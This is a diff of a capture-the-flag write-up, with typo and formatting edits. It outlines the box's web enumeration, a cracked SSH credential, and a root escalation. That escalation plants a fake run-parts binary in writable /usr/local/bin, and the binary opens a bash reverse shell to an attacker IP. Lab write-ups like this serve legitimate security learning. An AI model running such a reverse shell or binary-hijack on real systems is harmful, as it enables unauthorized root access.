@@ -5,7 +5,7 @@
 jkr   |raykayjay9|         |
        
 ### HTTP
-** /writeup`
+**`/writeup`**
 - `/modules` shows the installed modules
 - `/admin` shows the login prompt
 - `/index.php?page=` may be SQL injectable
@@ -29,13 +29,13 @@ jkr:raykayjay9
 6. The credential obtained can use to login via SSH and get the user flag.
 ### Root
 1. Found `/usr/local/bin` is writable for group `staff`, and the user is in the group. So we can hijack binaries.
-2. Use `pspy` to find every time user login, it call `/usr/bin/env run-parts`, so hijack it
+2. Use `pspy` to find every time user login, `/usr/bin/env run-parts` execute, so hijack it.
 ```
 $ cat << EOF > /usr/local/bin/run-parts
 bash -c "bash -i >& /dev/tcp/10.10.16.3/13337 0>&1"
 EOF
 $ chmod +x /usr/local/bin/run-parts
 ```
-3. Then login vis SSH from another pane, and get the root reverse shell.
+3. Then login via SSH from another pane, and get the root reverse shell.
 4. Get the root flag.
 
